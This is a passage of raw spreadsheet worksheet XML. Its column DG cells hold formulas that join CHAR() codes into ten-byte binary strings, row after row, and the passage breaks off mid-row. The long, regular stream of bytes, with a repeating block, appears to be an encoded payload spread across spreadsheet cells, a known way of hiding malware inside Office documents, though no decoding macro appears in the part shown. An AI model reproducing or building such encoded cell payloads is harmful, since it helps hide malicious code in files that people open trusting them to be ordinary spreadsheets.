        <f>CHAR(51)&amp;CHAR(226)&amp;CHAR(182)&amp;CHAR(179)&amp;CHAR(252)&amp;CHAR(77)&amp;CHAR(166)&amp;CHAR(46)&amp;CHAR(102)&amp;CHAR(178)</f>
        <v>3â¶³üM¦.f²</v>
      </c>
    </row>
    <row r="389" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG389" t="str">
        <f>CHAR(229)&amp;CHAR(190)&amp;CHAR(243)&amp;CHAR(105)&amp;CHAR(158)&amp;CHAR(73)&amp;CHAR(80)&amp;CHAR(199)&amp;CHAR(134)&amp;CHAR(237)</f>
        <v>å¾óižIPÇ†í</v>
      </c>
    </row>
    <row r="390" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG390" t="str">
        <f>CHAR(163)&amp;CHAR(12)&amp;CHAR(201)&amp;CHAR(120)&amp;CHAR(32)&amp;CHAR(190)&amp;CHAR(179)&amp;CHAR(239)&amp;CHAR(169)&amp;CHAR(29)</f>
        <v>£_x000C_Éx ¾³ï©_x001D_</v>
      </c>
    </row>
    <row r="391" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG391" t="str">
        <f>CHAR(235)&amp;CHAR(116)&amp;CHAR(61)&amp;CHAR(185)&amp;CHAR(212)&amp;CHAR(142)&amp;CHAR(125)&amp;CHAR(6)&amp;CHAR(195)&amp;CHAR(75)</f>
        <v>ët=¹ÔŽ}_x0006_ÃK</v>
      </c>
    </row>
    <row r="392" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG392" t="str">
        <f>CHAR(75)&amp;CHAR(227)&amp;CHAR(53)&amp;CHAR(15)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>Kã5_x000F_Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="393" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG393" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(210)&amp;CHAR(88)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†ÒXŸ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="394" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG394" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(108)&amp;CHAR(243)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(92)</f>
        <v>Ê|Ÿ_x001D_lóÕ†Ê\</v>
      </c>
    </row>
    <row r="395" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG395" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="396" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG396" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="397" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG397" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(88)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†úXŸ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="398" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG398" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="399" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG399" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(192)&amp;CHAR(94)</f>
        <v>Ÿ_x001D_R×Õ†Ê|À^</v>
      </c>
    </row>
    <row r="400" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG400" t="str">
        <f>CHAR(61)&amp;CHAR(165)&amp;CHAR(144)&amp;CHAR(254)&amp;CHAR(175)&amp;CHAR(49)&amp;CHAR(254)&amp;CHAR(116)&amp;CHAR(60)&amp;CHAR(215)</f>
        <v>=¥þ¯1þt&lt;×</v>
      </c>
    </row>
    <row r="401" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG401" t="str">
        <f>CHAR(184)&amp;CHAR(245)&amp;CHAR(169)&amp;CHAR(19)&amp;CHAR(237)&amp;CHAR(120)&amp;CHAR(55)&amp;CHAR(249)&amp;CHAR(177)&amp;CHAR(234)</f>
        <v>¸õ©_x0013_íx7ù±ê</v>
      </c>
    </row>
    <row r="402" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG402" t="str">
        <f>CHAR(166)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(39)&amp;CHAR(202)&amp;CHAR(92)</f>
        <v>¦|Ÿ_x001D_R×'Ê\</v>
      </c>
    </row>
    <row r="403" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG403" t="str">
        <f>CHAR(223)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(53)&amp;CHAR(156)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>ß_x001D_R×Õ†5œŸ_x001D_</v>
      </c>
    </row>
    <row r="404" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG404" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="405" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG405" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="406" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG406" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="407" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG407" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="408" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG408" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="409" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG409" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="410" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG410" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="411" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG411" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="412" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG412" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="413" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG413" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="414" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG414" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="415" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG415" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="416" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG416" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="417" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG417" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="418" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG418" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="419" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG419" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="420" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG420" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="421" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG421" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="422" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG422" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="423" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG423" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="424" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG424" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="425" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG425" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="426" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG426" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="427" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG427" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="428" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG428" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="429" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG429" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="430" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG430" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="431" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG431" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="432" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG432" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="433" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG433" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="434" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG434" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="435" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG435" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="436" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG436" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="437" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG437" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="438" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG438" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="439" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG439" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="440" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG440" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="441" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG441" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="442" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG442" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="443" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG443" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="444" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG444" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="445" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG445" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="446" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG446" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|Ÿ_x001D_R×Õ†Ê|</v>
      </c>
    </row>
    <row r="447" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG447" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(218)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Ô†Ú|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="448" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG448" t="str">
        <f>CHAR(74)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(6)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>J×Õ_x0006_Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="449" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG449" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Ô†</v>
      </c>
    </row>
    <row r="450" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG450" t="str">
        <f>CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(98)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(6)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ë|Ÿ_x001D_b×Õ_x0006_Ê|</v>
      </c>
    </row>
    <row r="451" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG451" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_R×Õ†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="452" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG452" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(215)</f>
        <v>R×Ô†Ê|Ÿ_x001D__x001A_×</v>
      </c>
    </row>
    <row r="453" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG453" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(146)&amp;CHAR(60)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(130)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†’&lt;Ÿ_x001D_‚ÕÕ†</v>
      </c>
    </row>
    <row r="454" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG454" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(26)&amp;CHAR(126)</f>
        <v>Ê|Ÿ_x001D_R×Õ†_x001A_~</v>
      </c>
    </row>
    <row r="455" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG455" t="str">
        <f>CHAR(171)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(131)&amp;CHAR(134)&amp;CHAR(153)&amp;CHAR(124)&amp;CHAR(192)&amp;CHAR(29)</f>
        <v>«_x001D_R×ƒ†™|À_x001D_</v>
      </c>
    </row>
    <row r="456" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG456" t="str">
        <f>CHAR(4)&amp;CHAR(215)&amp;CHAR(144)&amp;CHAR(134)&amp;CHAR(152)&amp;CHAR(124)&amp;CHAR(204)&amp;CHAR(29)&amp;CHAR(27)&amp;CHAR(215)</f>
        <v>_x0004_×†˜|Ì_x001D__x001B_×</v>
      </c>
    </row>
    <row r="457" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG457" t="str">
        <f>CHAR(154)&amp;CHAR(134)&amp;CHAR(132)&amp;CHAR(124)&amp;CHAR(192)&amp;CHAR(29)&amp;CHAR(27)&amp;CHAR(215)&amp;CHAR(155)&amp;CHAR(134)</f>
        <v>š†„|À_x001D__x001B_×›†</v>
      </c>
    </row>
    <row r="458" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG458" t="str">
        <f>CHAR(140)&amp;CHAR(124)&amp;CHAR(208)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(119)&amp;CHAR(120)</f>
        <v>Œ|Ð_x001D_R×Õ†wx</v>
      </c>
    </row>
    <row r="459" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG459" t="str">
        <f>CHAR(112)&amp;CHAR(227)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>pãR×Ô†Ê|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="460" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG460" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)</f>
        <v>R×Õ†Ê|Ÿ_x001D_R×</v>
      </c>
    </row>
    <row r="461" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG461" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(245)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†õ|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="462" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG462" t="str">
        <f>CHAR(206)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(80)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Î|Ÿ_x001D_P×Õ†Ê|</v>
      </c>
    </row>
    <row r="463" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG463" t="str">
